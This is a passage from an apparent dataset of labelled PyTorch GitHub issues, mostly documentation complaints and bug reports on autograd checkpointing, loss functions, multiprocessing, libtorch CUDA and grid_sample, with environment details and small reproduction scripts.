b)).sum()\r\n\r\n#                 +--> Log[a] --> a\r\n# Sum --> Cat[a, b]\r\n#                 +--> Checkpoint(Log[b]) --> b\r\nout.backward()\r\n```\r\n\r\nNow check `timeline` to detect the recursion. We can see that the backward of `Log[a]` is evaluated in the backward of `Checkpoint(Log[b])`:\r\n```python\r\n>>> print(timeline)\r\n['a:forward', 'b:forward', 'b:forward', 'a:backward', 'b:backward']\r\n>>> # forward pass -----|  |            |- Log[a] -|             |\r\n>>> #                      |--------- Checkpoint(Log[b]) --------|\r\n```\r\n\r\n## Expected behavior\r\n\r\nIn my reproducing code, `timeline` should follow the below order because there's no dependency between `Checkpoint(Log[b])` and `Log[a]`:\r\n```python\r\nassert timeline == \\\r\n    ['a:forward', 'b:forward', 'b:forward', 'b:backward', 'a:backward']\r\n#    |----------------------|  |-----------------------|  |----------|\r\n#          forward pass            Checkpoint(Log[b])        Log[a]\r\n```\r\n\r\nI read `autograd/engine.cpp` including the `[Reentrant backwards]` note. If my understanding is correct, nested backwards should evaluate only the tasks which it queued. Because of a specified `graph_task` and the sorting rule of `ReadyQueue`.\r\n\r\n## Environment\r\n\r\nI reproduced it on ffc7158bf2f97916305217e4203ef846c00161ce (`master`) and bb15580e88cc963df22eab291fbe182f42426ad5 (v1.0.1).\r\n```\r\nPyTorch version: N/A\r\nIs debug build: N/A\r\nCUDA used to build PyTorch: N/A\r\n\r\nOS: Ubuntu 16.04.5 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: N/A\r\nCUDA runtime version: 9.0.176\r\nGPU models and configuration:\r\nGPU 0: Tesla V100-SXM2-32GB\r\nGPU 1: Tesla V100-SXM2-32GB\r\nGPU 2: Tesla V100-SXM2-32GB\r\nGPU 3: Tesla V100-SXM2-32GB\r\n\r\nNvidia driver version: 396.44\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.4.1\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.2\r\n[conda] blas                      1.0                         mkl\r\n[conda] magma-cuda90              2.5.0                         1    pytorch\r\n[conda] mkl                       2019.3                      199\r\n[conda] mkl-include               2019.3                      199\r\n[conda] mkl_fft                   1.0.10           py36ha843d7b_0\r\n[conda] mkl_random                1.0.2            py36hd81dba3_0\r\n```\r\n\r\n## Additional context\r\n\r\nI think https://github.com/pytorch/pytorch/issues/6959 is related with this issue. As @shubhtuls said, there's no reason for checkpointing to rely on nested recursions."},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/torch.html#torch.arange and https://pytorch.org/docs/master/torch.html#torch.range say that they uses the default floating point dtype, but the default dtype is `int64`"},{"labels":["documentation",null,null],"text":"Reported by @jph00\r\n\r\n> new_tensor is a legacy constructor and is not supported in the JIT\r\n\r\nIt'd be helpful to know in the error message what the non-legacy alternative is."},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nAnother student and I have been working out how to use the new CTCLoss function, and the documentation is somewhat incomplete. I want to point out some possible problems, and suggest changes to the example script.\r\n\r\nProblems:\r\n  - **S** is not defined for the shape of `targets`. S should be the length of the targets?\r\n  - It appears that each value in **S** should be the index of the target, similar to CrossEntropy loss, but this is not explained\r\n  - For the example code, why would the target indices start at 1 instead of 0?\r\n  - `sum(target_lengths)` is not clear\r\n  - For the example code, variables are not named in terms of **S,N,T,C**\r\n  - It is unclear why `target_lengths` would ever need to contain values less than the true length of the target sequences, and it appears that \"length\" is actually the stop index? (in the example) I assume there is some intended reason for this, but it is a bit confusing why lengths are specified separately from the sequences themselves.\r\n\r\nA possible improvement of the example script might look something like this (`x` and `y` could be replaced with `input` and `target`)\r\n\r\n```\r\nfrom torch import nn\r\nimport torch\r\n\r\n\r\nT = 50  # Input sequence length\r\nC = 20  # Number of classes\r\nN = 16  # Batch size\r\nS = 30  # Target sequence length\r\n\r\nminimum_target_length = 10\r\n\r\nctc_loss = nn.CTCLoss()\r\nx = torch.randn(T, N, C).log_softmax(2).detach().requires_grad_()    # [size] = T,N,C\r\ny = torch.randint(1, C, (N, S), dtype=torch.long)                    # low, high, [size]\r\n\r\nx_lengths = torch.full((N,), T, dtype=torch.long)                           # Length of inputs\r\ny_lengths = torch.randint(minimum_target_length,S,(N,), dtype=torch.long)   # Length of targets can be variable (even if target sequences are constant length)\r\n\r\nloss = ctc_loss(x, y, x_lengths, y_lengths)\r\nloss.backward()\r\n\r\nprint(\"x.shape\", x.shape)\r\nprint(\"y.shape\", y.shape)\r\nprint(\"x_lengths\", x_lengths)\r\nprint(\"y_lengths\", y_lengths)\r\n\r\nprint(loss)\r\n```\r\n\r\nHopefully this would save people some time figuring out the currently unstated requirements of CTCLoss.\r\n\r\ncredit to @Jacob0G for helping find some of these issues"},{"labels":[null,null,null,"documentation",null],"text":"## ❓ Questions and Help\r\n\r\n### Please note that this issue tracker is not a help form and this issue will be closed.\r\n\r\nWe have a set of [listed resources available on the website](https://pytorch.org/resources). Our primary means of support is our discussion forum:\r\n\r\n- [Discussion Forum](https://discuss.pytorch.org/)\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @yf225"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nThe documentation in https://pytorch.org/docs/stable/torch.html#torch.addcmul seem to suggest that the precedence for the operators are as follows\r\n\r\nout = tensor + value * (tensor1 * tensor2)\r\n\r\nIs that correct? In general, since floating point operators do not commute, could the precedence for addcmul and addcdiv be clarified? Such information is important for numerical troubleshooting.\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nI find the sentence: \r\n\r\n> This criterion expects a class index (0 to C-1) as the target\r\n\r\nmisleading.\r\n\r\nAn exception should be mentionned for the value of `ignore_index`. If my understanding is correct, any value is allowed for `ignore_index`, which will then be allowed as a value in `target`.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"Jupyter notebooks which can be downloaded at tutorial pages (ex. https://pytorch.org/tutorials/beginner/blitz/tensor_tutorial.html) contain wrong notations as described below.\r\n\r\n```\r\nConverting NumPy Array to Torch Tensor\r\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\nSee how changing the np array changed the Torch Tensor automatically\r\n```\r\n\r\nThis is rendered on jupyter notebook as below.\r\n\r\n![image](https://user-images.githubusercontent.com/25898373/53683913-06a71c00-3d4a-11e9-8cfa-d36146729862.png)\r\n\r\n`###` can be used instead, I think.\r\n\r\nExample: https://pytorch.org/tutorials/_downloads/3c2b25b8a9f72db7780a6bf9b5fc9f62/tensor_tutorial.ipynb\r\n\r\nRegards."},{"labels":[null,null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nI am interested in the following workflow, but my impression is that this use case is not supported (yet?):\r\n\r\n1. Prototype a model in **Python**\r\n2. Export model to **C++** via TorchScript (`torch.jit.trace`)\r\n3. Train model in **C++**\r\n\r\nBased on the documentation, it is unclear whether this workflow is supported or not. The very first sentence of https://pytorch.org/docs/master/jit.html states\r\n\r\n> TorchScript is a way to create serializable and **optimizable models** from PyTorch code\r\n\r\nHowever, it is ambiguous if \"**optimizable**\" refers to training or the jit compilation process here. \r\n\r\nIt seems that `torch::jit::script::Module` is treated as a special case which does not share commonality / a base class with `torch::nn::Module`. Is there also a way to access the parameters of a `torch::jit::script::Module` in order to use it for training? At first I thought \"**optimizable models**\" was referring to this but I am unsure now.\r\n\r\nThis issue is related to the post: https://discuss.pytorch.org/t/can-scriptmodule-be-used-for-training/35932\r\n\n\ncc @suo @yf225"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nThe docs for [torch.nn.Module](https://pytorch.org/docs/stable/nn.html#torch.nn.Module) does not list  `_version` nor to the `_load_from_state_dict`. It should be listed to describe how to make a module backward compatible with its former weights.\r\nHere are the docstrings I think should be included:\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/module.py#L50-L60\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/nn/modules/module.py#L649-L681"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThere are 3 parameters documented that all try to solve the same problem: `size_average`, `reduce`, `reduction`.  It's fine to document legacy behavior, but IMO it should be done after the non-legacy behavior has been explained concisely.\r\n\r\nAlso, some of the documentation is just wrong.  For example:\r\n`If reduce is True (default)`\r\n\r\nbut the default of `reduce` is `None`.\r\n\r\nAlso:\r\n` ‘mean’: the sum of the output will be divided by the number of elements in the output`\r\n\r\nBut as shown in the formula above, it's divided by `weight[targets].sum()`."},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/master/torch.html#torch.broadcast_tensors\r\n![image](https://user-images.githubusercontent.com/5652049/53575547-ca07d480-3b3f-11e9-909d-7eed4e667c07.png)\r\n\r\n`_broadcasting-semantics` should be a link to our broadcasting semantics page, but it is not rendered correctly.\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nHi. Thanks for the great library. I have a short example below detailing my question. I couldn't find any info about this in the docs or on the pytorch forums.\r\n\r\n```\r\nimport torch\r\nimport numpy as np\r\ntorch.manual_seed(21)\r\n\r\nA = (torch.rand(10, 10, 10) > 0.9)\r\ni, j, k = A.nonzero().t()\r\nijk = torch.stack((i, j, k), dim=1).numpy()\r\ninds = np.lexsort(ijk[:, ::-1].T)\r\nijk_sorted = ijk[inds]\r\n\r\nprint((ijk == ijk_sorted).all())\r\n>> True\r\n```\r\n\r\nI was just wondering if this behavior is guaranteed by the API? I would like to depend on the lexicographic ordering in my application without paying for an additional sort. Numpy's documentation for the corresponding `numpy.nonzero` mentions that \"The values are always tested and returned in row-major, C-style order.\" Maybe a similar blurb could be added to the torch docs? Hope my question makes sense."},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nSpecifically, the entry https://pytorch.org/docs/stable/tensors.html#torch.Tensor.cpu says that no copy is made if \"this object is already in CPU memory and on the correct device\". For CPU tensors, there should be one device, so the last part doesn't make sense."},{"labels":["documentation"],"text":"## 🐛 Bug\r\n\r\nDescription of `torch.distributed.broadcast_multigpu` have broken in-line code, but I can't figure out a way to resolve it.\r\nPossibly a markdown-related issue with Sphinx?\r\n\r\nCode: https://github.com/pytorch/pytorch/blob/master/torch/distributed/distributed_c10d.py#L668-L669\r\n\r\nDoc. link with problem: https://pytorch.org/docs/stable/distributed.html#torch.distributed.broadcast_multigpu\r\n\r\n![image](https://user-images.githubusercontent.com/13394294/52993393-60107080-3457-11e9-917f-ab07f53ac021.png)\r\n\r\n\r\n"},{"labels":["documentation"],"text":"Hello,\r\n\r\nThe explanation of `pos_weight` for [BCEWithLogitsLoss](https://pytorch.org/docs/stable/nn.html#torch.nn.BCEWithLogitsLoss) mentions:\r\n`where :math:`p_n` is the positive weight of class :math:`n`.`\r\n\r\nWe don't have `n` classes (this is a binary loss). The correct description would be something like this:\r\n`:math:p_n is the weight of the positive class for sample n in the batch`\r\n\r\n(I also don't understand the utility of having a different positive-class-weight per sample in a batch, because you usually apply the same class weight for the whole training data. But that's a different issue.)"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\n`torch.lerp` takes in `start` and `end`, but so does `tensor.lerp`? Shouldn't the `tensor` be used as `start` (or `end`)? And the doc should be clear which one it is.\r\n\r\n<img width=\"919\" alt=\"screenshot 2019-02-16 16 51 42\" src=\"https://user-images.githubusercontent.com/5674597/52905660-3a8f2700-320b-11e9-914f-ba4246e07548.png\">\r\n"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nThe following program never terminates.\r\n\r\n```\r\nimport torch\r\nimport torch.multiprocessing as mp\r\n\r\n\r\ndef foo():\r\n    x = torch.ones((2, 50, 10))\r\n    return torch.einsum('ijl,ikl->ijk', x, x)\r\n\r\n\r\nif __name__ == '__main__':\r\n    foo()\r\n    p = mp.Process(target=foo)\r\n    p.start()\r\n    p.join()\r\n```\r\n\r\nThe behavior persists if one changes the `einsum` inside `foo` with an equivalent operation (e.g., `bmm(y, y.transpose(1,2))`, or `(y.unsqueeze(2) * y.unsqueeze(1)).sum(3)`.\r\n\r\nIt doesn't reproduce, however, if one doesn't call `foo` inside the main block.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.0.1.post2\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Arch Linux\r\nGCC version: (GCC) 8.2.1 20181127\r\nCMake version: version 3.13.4\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\n## Additional context\r\n\r\nPerhaps related to #2245."},{"labels":["documentation"],"text":"\r\nMissing  Examples in the docs for samplers like WeightedRandomSampler .\r\n\r\nCame across the problem from here :\r\n\r\nhttps://forums.fast.ai/t/weighted-random-sampler-pytorch/27947 \r\n"},{"labels":["documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\nCannot create a `torch.multiprocessing.pool.Pool` instance.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\nPython 3.6.3rc1+ (default, Feb  5 2019, 15:51:57)\r\nType 'copyright', 'credits' or 'license' for more information\r\nIPython 6.5.0 -- An enhanced Interactive Python. Type '?' for help.\r\n\r\nIn [1]: from torch.multiprocessing.pool import Pool\r\n\r\nIn [2]: p = Pool(1)\r\n---------------------------------------------------------------------------\r\nTypeError                                 Traceback (most recent call last)\r\n<ipython-input-5-ce2ba693018c> in <module>()\r\n----> 1 p = Pool(1)\r\n\r\n/usr/local/fbcode/gcc-5-glibc-2.23/lib/python3.6/multiprocessing/pool.py in __init__(self, processes, initializer, initargs, maxtasksperchild, context)\r\n    154                  maxtasksperchild=None, context=None):\r\n    155         self._ctx = context or get_context()\r\n--> 156         self._setup_queues()\r\n    157         self._taskqueue = queue.Queue()\r\n    158         self._cache = {}\r\n\r\n/mnt/xarfuse/uid-169887/8eb75d00-ns-4026531840/torch/multiprocessing/pool.py in _setup_queues(self)\r\n     21\r\n     22     def _setup_queues(self):\r\n---> 23         self._inqueue = SimpleQueue()\r\n     24         self._outqueue = SimpleQueue()\r\n     25         self._quick_put = self._inqueue._writer.send\r\n\r\nTypeError: __init__() missing 1 required keyword-only argument: 'ctx'\r\n```\r\n\r\n## Expected behavior\r\n\r\nNo exception."},{"labels":["documentation"],"text":"e.g. https://github.com/pytorch/pytorch/issues/16894\r\n\r\nThere's a lot of people asking about this, but no canonical source of information about it."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe explanation of `pos_weight` for [BCEWithLogitsLoss](https://pytorch.org/docs/stable/nn.html#torch.nn.BCEWithLogitsLoss) mentions:\r\n`where :math:`p_n` is the positive weight of class :math:`n`.`\r\n\r\nWe don't have `n` classes (this is a binary loss). The correct description would be something like this:\r\n `:math:p_n is the weight of the positive class for sample n in the batch`\r\n\r\n(I also don't understand the utility of having a different positive-class-weight per sample in a batch, because you usually apply the same class weight for the whole training data. But that's a different issue.)"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nSee attached image. \"Tuple of ints\" is rendered as \"Tuple of python:ints\" instead of \"int\" being converted into a cross-reference.\r\n\r\n\r\n<img width=\"536\" alt=\"image\" src=\"https://user-images.githubusercontent.com/1893159/51939676-10053780-23de-11e9-80e2-7fa091ea4396.png\">\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/nn.html#one-hot"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nis it `bool` instead of `float`?\r\n\r\nhttps://pytorch.org/docs/stable/nn.html?highlight=tripletmarginloss#torch.nn.TripletMarginLoss\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\n`CLASSMETHOD` overlays the method name `from_pretrained`, making it difficult to interpret. See https://pytorch.org/docs/stable/nn.html#torch.nn.Embedding.from_pretrained.\r\n\r\n![screen shot 2019-01-27 at 20 58 57](https://user-images.githubusercontent.com/36465988/51803047-6ce5de00-2276-11e9-8e0d-bba4174783f9.png)"},{"labels":["documentation"],"text":"Wikipedia: https://en.wikipedia.org/wiki/Jacobian_matrix_and_determinant\r\n\r\n<img width=\"860\" alt=\"screenshot 2019-01-24 19 24 14\" src=\"https://user-images.githubusercontent.com/5317244/51717139-a9fb6780-200d-11e9-95b6-589ba859b221.png\">\r\n\r\nPyTorch docs: https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html\r\n\r\n![image](https://user-images.githubusercontent.com/5317244/51717148-b4b5fc80-200d-11e9-90d4-74f663d5a59d.png)\r\n\r\nWhy deviate from the convention? \r\n\r\nHad to stare at it for a bit to realize the definition of the Jacobian is the transpose in PyTorch. "},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n![screenshot_2019-01-24 probability distributions - torch distributions pytorch master documentation](https://user-images.githubusercontent.com/5520155/51647989-eadf7780-1f4c-11e9-8a6a-a3310705513e.png)\r\n\r\nThe [documentation for Categorical distributions](https://pytorch.org/docs/stable/distributions.html) states that it can take logits, which it calls \"event log **probabilities**\". I think this should either be log odds. This is minor but the terminology with logits is confusing enough already."},{"labels":["documentation",null],"text":"## 🚀 Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\n\r\nAfter https://github.com/pytorch/pytorch/pull/15414, torhch.norm supports dtype, but not with 'fro' or 'nuc' arguments.  This is confusing and not documented.\r\n\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n"},{"labels":[null,"documentation",null],"text":"we writing a Mixed C++/CUDA extension(https://pytorch.org/tutorials/advanced/cpp_extension.html)\r\nsuccess compile and running test in pytorch=0.4.1 and python= 3.6\r\nhowever suffer bug in pytorch=1.0 and python= 3.6 \r\n`anaconda3/envs/python3.6_pytorch1.0/lib/python3.6/site-packages/torch/lib/include/torch/csrc/jit/argument_spec.h(59): error: static assertion failed with \"ArgumentInfo is to be a POD struct`\r\n\r\nin order to success compile ，We have to uncomment/disable line 59-60 in torch/lib/include/torch/csrc/jit/argument_spec.h \r\n`static_assert(std::is_pod<ArgumentInfo>::value,\r\n  \"ArgumentInfo is to be a POD struct\");`\r\n\r\nSO We wonder is check pod necessary ？ What is the significance of doing this?\r\n\r\nTHX"},{"labels":["documentation",null],"text":"Documentation for ### scatter_ method lists the following arguments: **scatter_(dim, index, src)** \r\nIt also, incorrectly, states that **src** can be a tensor or a float.\r\nBut it looks like, that in release 1.0.0, **src** cannot be a single float number. When you want to write the single float value to the tensor, you need to use undocumented **value** parameter, not **src** parameter. E.g. my_tensor.scatter_(dim=1, index=index_tensor, value=0.0)\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThere seems to be a lot of confusion around Mutilabel losses. \r\n- https://discuss.pytorch.org/t/multi-label-classification-in-pytorch/905\r\n- https://discuss.pytorch.org/t/help-about-multi-classification/14418 \r\n- https://discuss.pytorch.org/t/why-multilabelmarginloss-take-torch-long-has-arguments/28970\r\n- https://discuss.pytorch.org/t/multilabelmarginloss-input-formation/9155/2\r\n\r\nOne area in particular is it looks like there needs to be more clarity on what the target format of MultiLabelMarginLoss and MultiLabelSoftMarginLoss. One top-search-result example https://gist.github.com/bartolsthoorn/36c813a4becec1b260392f5353c8b7cc has over 1500 link follows on the forums but actually implements it incorrectly (uses a onehot instead of class indices with negative number padding).\r\n\r\nIt might be useful to explicitly point out in https://github.com/pytorch/pytorch/blob/cb3241866917024a59955a5099a8eab461357d9c/torch/nn/modules/loss.py#L941 that it is not a onehot target, and perhaps provide an example in the docs.\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\nWhen a documentation page loads, I need to wait a few seconds before being able to CTR+F (find in page) what I want. While it loads, things jump around. I preferred the old documentation website, I don't like the upgrade, although the upgrade looks way nicer, it was previously more functional. "},{"labels":[null,"documentation"],"text":"Mentioning the implementation of CReLU in the docs near ReLU in the way mentioned in #1327"},{"labels":[null,"documentation"],"text":"## 🐛 Bug\r\n\r\nIn libtorch, my program crashes when trying to move a tensor to CUDA.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\nI can't share the whole code but here is some context. This is the constructor of CustomOp, where the error happens: \r\n\r\nCustomOp()\r\n: filter(torch::zeros({1, 1, 4, 4}))\r\n{\r\n\t.................\r\n\t\r\n\tauto accessor = filter.accessor<float,4>();\r\n\tfor (int x = 0; x < 4; ++x) {\r\n\t\tfor (int y = 0; y < 4; ++y) {\r\n\t\t\taccessor[0][0][x][y] = ............;\r\n\t\t}\r\n\t}\r\n\t\r\n\tfilter = filter.to(at::kCUDA);\r\n}\r\n\r\nThe program crashes on the line \"filter = filter.to(at::kCUDA);\".\r\n\r\nThis CustomOp instance is created as a member of the Network class, which has no superclass (just like CustomOp), with its default (and only) constructor, at the very beginning of main():\r\n\r\n#include \"network.h\"\r\n\r\nint main() {\r\n    Network network;\r\n    ......................\r\n\r\nError message:\r\n\r\nterminate called after throwing an instance of 'c10::Error'\r\n  what():  p ASSERT FAILED at /pytorch/c10/impl/DeviceGuardImplInterface.h:130, please report a bug to PyTorch. DeviceGuardImpl for cuda is not available (getDeviceGuardImpl at /pytorch/c10/impl/DeviceGuardImplInterface.h:130)\r\nframe #0: std::function<std::string ()>::operator()() const + 0x11 (0x7fd1101802e1 in ~/libtorch/lib/libc10.so)\r\nframe #1: c10::Error::Error(c10::SourceLocation, std::string const&) + 0x2a (0x7fd11017fc1a in ~/libtorch/lib/libc10.so)\r\nframe #2: at::native::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) + 0x1604 (0x7fd110b4d704 in ~/libtorch/lib/libcaffe2.so)\r\nframe #3: at::TypeDefault::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x17 (0x7fd110cf7f57 in ~/libtorch/lib/libcaffe2.so)\r\nframe #4: torch::autograd::VariableType::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x17a (0x7fd11980a16a in ~/libtorch/lib/libtorch.so.1)\r\nframe #5: at::Tensor::to(c10::TensorOptions const&, bool, bool) const + 0x68 (0x439c36 in ./aten_app)\r\nframe #6: custom_ops::CustomOp::CustomOp() + 0x214 (0x43b3fc in ./aten_app)\r\nframe #7: Network::Network() + 0x44 (0x424498 in ./aten_app)\r\nframe #8: main + 0x2b (0x441ec2 in ./aten_app)\r\nframe #9: __libc_start_main + 0xf0 (0x7fd10f81e830 in /lib/x86_64-linux-gnu/libc.so.6)\r\nframe #10: _start + 0x29 (0x41e4f9 in ./aten_app)\r\n\r\nAborted (core dumped)\r\n\r\n## Expected behavior\r\n\r\nThe app does not crash.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.0.0a0+5e62494\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.2.88\r\n\r\nOS: Ubuntu 16.04.3 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCMake version: version 3.12.0-rc2\r\n\r\nPython version: 3.5\r\nIs CUDA available: Yes\r\nCUDA runtime version: 9.2.88\r\nGPU models and configuration: \r\nGPU 0: TITAN X (Pascal)\r\nGPU 1: TITAN X (Pascal)\r\n\r\nNvidia driver version: 396.26\r\ncuDNN version: Probably one of the following:\r\n/usr/lib/x86_64-linux-gnu/libcudnn.so.6.0.21\r\n/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn.so.7.2.1\r\n/usr/local/cuda-9.2/targets/x86_64-linux/lib/libcudnn_static.a\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy (1.13.3)\r\n[pip3] torch (1.0.0a0+5e62494)\r\n[pip3] torchfile (0.1.0)\r\n[pip3] torchvision (0.1.9)\r\n[conda] Could not collect\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nDocument display error，Eg ： https://pytorch.org/cppdocs/api/classat_1_1_tensor.html?highlight=mm#_CPPv3NK2at6Tensor5addmmERK6TensorRK6Tensor6Scalar6Scalar \r\n\r\n![image](https://user-images.githubusercontent.com/15956648/50578045-f1f3f800-0e6e-11e9-914c-7b2cf05d04fd.png)\r\n"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\n@soumyarooproy writes:\r\n\r\n-----------------------------------------------------\r\n\r\nI wrote this tutorial — https://github.com/soumyarooproy/scratchpad/blob/master/PyTorchNewTensorType.md — for steps to add a new scalar/tensor type. I used `bfloat16` as an example. Could one of you please take a look at it? The write-up is obviously based on my current understanding of PyTorch internals. I would very much appreciate some feedback on it.\r\n\r\nAccompanying references:\r\n- pytorch changes: https://github.com/soumyarooproy/pytorch/pull/1\r\n- c++ extension repo:\r\nhttps://github.com/soumyarooproy/bfloat16_pytorch_cpp_extn\r\n\r\n----------------------------------------------------\r\n\r\nBecause it's the holidays, I'm just opening an issue to track and give feedback so that it doesn't get lost in the noise.\r\n\r\ncc: @li-roy @gchanan @goldsborough @ezyang \r\n\r\n@soumyarooprooy things will likely change fast, see PRs by @li-roy for context such as https://github.com/pytorch/pytorch/pull/15153"},{"labels":["documentation"],"text":"## 📚 Documentation\r\n\r\ndocumentation lists:\r\n\r\n> dim (int or tuple of python:ints) – the dimension or dimensions to reduce\r\n\r\nbut underlying function is declared as:\r\n`Tensor logsumexp(const Tensor & self, int64_t dim, bool keepdim)`\r\n\r\nand calling with multiple dimensions fails:\r\n`torch.logsumexp(torch.tensor([[1.],[2.]]),(0,1))`\r\n`TypeError: logsumexp(): argument 'dim' (position 2) must be int, not tuple\r\n`"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nunderlying aten routine in c++ indicates a single tensor is returned:\r\n\r\n`Tensor ormqr(const Tensor & self, const Tensor & input2, const Tensor & input3, bool left=true, bool transpose=false);\r\n`"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nThe function `F.grid_sample` takes two args: `inputs`and `coords`. For the sake of simplicity I'm going to describe this issue for the case when `inputs` represents a grayscale image and has a shape `[1, 1, IH, IW]`. \r\n\r\nThe `coords` argument has shape `[1, OH, OW, 2]`, where the final dimension of size 2 is an x and y coordinate in normalized input space, where `-1,-1` is the top left of the image and `+1,+1` is the bottom right. \r\n\r\nThe `[1, C, OH, OW]` output is constructed by sampling values from the input at the xy-coordinate specified in the `coords` argument. Bilinear interpolation is used when the xy-coordinate (after de-normalization) doesn't fall cleanly within a single pixel in `inputs`.\r\n\r\nThe bug has to do with the behavior when a value in `coords` falls outside of the range `[-1,1]`. The docs state that the value should be bilinearly based on the border mode (the default behaves as if the entire input image was surrounded with zeros). This works in most cases. However, this fails in the case where `IH=1`.\r\n\r\n\r\n## To Reproduce\r\n\r\nFirst consider the working case. Lets just make a 2x2 image and sample \"under it\" at the normalized position `(0, 30)` (which is very far under the sample image).\r\n\r\n```\r\n        # Make a 2x2 image\r\n        inputs = torch.Tensor([\r\n            [1, 2],\r\n            [1, 2]\r\n        ])[None, None]\r\n\r\n        # Sample at a position way outside of the image\r\n        coords = torch.Tensor([0, 30])[None, None, None]\r\n        print(F.grid_sample(inputs, coords))\r\n```\r\n\r\nThis code correctly returns that the sampled value is `tensor([[[[0.]]]])` (because, again, we are way off the image). \r\n\r\nHowever, if we remove a row from the image (making it have shape (1, 2)) and we sample way underneath the image again, we get a non-zero result.\r\n\r\n```\r\n        inputs = torch.Tensor([\r\n            [1, 2],\r\n        ])[None, None]\r\n        coords = torch.Tensor([0, 30])[None, None, None]\r\n        print(F.grid_sample(inputs, coords))\r\n```\r\n\r\nThis outputs `tensor([[[[1.5000]]]])`, which seems to indicate that torch is treating the image as if it is infinitely tiled in the Y direction. \r\n\r\n## 